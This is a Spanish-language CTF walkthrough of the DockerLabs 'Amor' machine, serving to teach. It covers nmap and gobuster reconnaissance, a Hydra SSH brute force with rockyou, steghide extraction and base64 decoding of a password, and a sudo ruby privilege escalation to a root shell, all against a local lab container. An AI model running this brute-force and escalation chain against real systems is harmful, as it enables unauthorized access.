# Reto Amor - DockerLabs ✨

**My. Uribe Vergara Carlos Augusto 

---

## Introducción
DockerLabs es una plataforma que ofrece una serie de desafíos prácticos relacionados con Docker, organizados por niveles de dificultad. En esta oportunidad, se abordará el reto "Amor" clasificado como **Fácil**, utilizando herramientas esenciales en ciberseguridad ofensiva como `nmap`, `hydra`, `gobuster`, `steghide`, entre otras.

---

## Requisitos Previos
- Sistema Kali Linux (actualizado).
- Docker instalado.
- Conectividad en red con la máquina host y la DockerLab.
- Wordlists comunes (`rockyou.txt`, `directory-list-2.3-medium.txt`).

---

## Despliegue del laboratorio

### Paso 1: Transferencia de archivos desde la host
```bash
scp -r amor kali@192.168.1.12:/home/kali/Documents/
```

### Paso 2: Instalación de Docker (si no está instalado)
```bash
sudo apt install docker.io
```

### Paso 3: Ejecución del script de despliegue
```bash
cd Documents/amor
chmod +x auto_deploy.sh
./auto_deploy.sh amor.tar
```

---

## Escaneo y reconocimiento

### Paso 4: Ver interfaz de red
```bash
ip add
```

### Paso 5: Descubrimiento de hosts
```bash
sudo netdiscover -i docker0 -r 172.17.0.0/24
```

### Paso 6: Escaneo de puertos y servicios
```bash
sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
```

---

## Fuzzing Web
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## Fuerza bruta SSH con Hydra
```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
```

---

## Acceso a SSH y exploración
```bash
ssh carlota@172.17.0.2
cd /carlota/Desktop/fotos/vacaciones
```

### Transferencia de la imagen a Kali
```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
```

---

## Análisis de archivo e ingeniería inversa

### Tipo de archivo
```bash
file imagen.jpg
```

### Extracción con esteganografía
```bash
steghide --extract -sf imagen.jpg
```

### Decodificación de base64
```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
```

### Escalada de privilegios
```bash
su oscar
sudo -l
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
whoami
```

---
